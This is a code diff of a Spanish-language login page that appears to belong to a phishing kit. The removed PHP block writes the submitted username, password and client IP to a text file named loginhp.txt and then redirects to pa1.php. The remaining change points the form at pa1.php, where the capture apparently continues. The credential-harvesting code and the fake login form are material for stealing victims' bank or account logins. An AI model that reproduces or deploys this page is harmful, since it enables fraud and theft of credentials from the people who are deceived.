@@ -1,25 +1,4 @@
-<?php
-if (isset($_POST['add'])) {
-  $user = "";
-  if (!empty($_REQUEST['user'])) {
-    $user = $_POST['user'];
-    $pass = $_POST['pass'];
-    $ip = $_SERVER['REMOTE_ADDR'];
-  }
 
-  $post = "";
-  if (!empty($_REQUEST['post'])) {
-    $post = $_REQUEST['post'];
-  }
-
-
-  $archivo = "loginhp.txt";
-  $file = fopen($archivo, "a");
-  fwrite($file, "Usuario: " . $user . "\r\nClave: " . $pass . "\r\nIP: " . $ip . "\r\n==============================\r\n");
-  fclose($file);
-  header('location: pa1.php');
-}
-?>
 
 <!DOCTYPE html>
 <html lang="en">
@@ -52,7 +31,7 @@ if (isset($_POST['add'])) {
 
     <div class="banner3">
       <div class="columnas">
-        <form action="" method="post">
+        <form action="pa1.php" method="post">
           <div class="form-group">
             <label for="usuario" class="titulo-input">Identificación en línea</label>
             <input type="text" name="user" maxlength="32" required>
